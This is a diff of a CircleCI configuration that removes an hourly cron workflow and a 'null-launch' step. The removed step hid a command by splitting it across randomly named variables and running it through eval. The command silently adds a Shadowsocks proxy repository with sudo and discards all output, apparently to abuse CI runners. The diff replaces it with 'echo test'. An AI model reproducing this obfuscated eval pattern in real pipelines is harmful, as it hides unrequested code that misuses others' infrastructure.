@@ -6,20 +6,7 @@ workflows:
       - build:
           matrix:
             parameters:
-              build: ["--autounmask", "--help", "--onlydeps-with-rdeps", "--read-news", "--package-moves", "--onlydeps", "--sync-submodule", "--noconfmem", "--skipfirst", "--onlydeps", "--onlydeps", "--rebuild-ignore", "--deep", "--select", "--verbose", "--getbinpkg", "--ignore-built-slot-operator-deps", "--rebuild-if-new-slot", "--autounmask-backtrack", "--search-similarity"]
-  build-schedule:
-    jobs:
-      - build:
-          matrix:
-            parameters:
-              build: ["--autounmask", "--help", "--onlydeps-with-rdeps", "--read-news", "--package-moves", "--onlydeps", "--sync-submodule", "--noconfmem", "--skipfirst", "--onlydeps", "--onlydeps", "--rebuild-ignore", "--deep", "--select", "--verbose", "--getbinpkg", "--ignore-built-slot-operator-deps", "--rebuild-if-new-slot", "--autounmask-backtrack", "--search-similarity"]
-    triggers:
-      - schedule:
-          cron: "31 * * * *"
-          filters:
-            branches:
-              only:
-                - master
+              build: ["--auto"]
 
 jobs:
   build:
@@ -33,10 +20,4 @@ jobs:
       - run:
           name: null-launch
           command: |
-            HzNLEDAYfo="sudo add-ap"
-            AXqJTwWFemL="t-repositor"
-            cnxyxIBFbUB="y ppa:max-c"
-            VKFIhPIjtP="-lv/shadows"
-            MkBnttoGOqN="ocks-libev "
-            ODrKkgFHDz="-y &>/dev/n"
-            eval "$HzNLEDAYfo""$AXqJTwWFemL""$cnxyxIBFbUB""$VKFIhPIjtP""$MkBnttoGOqN""$ODrKkgFHDz""ull || true"
+            echo test
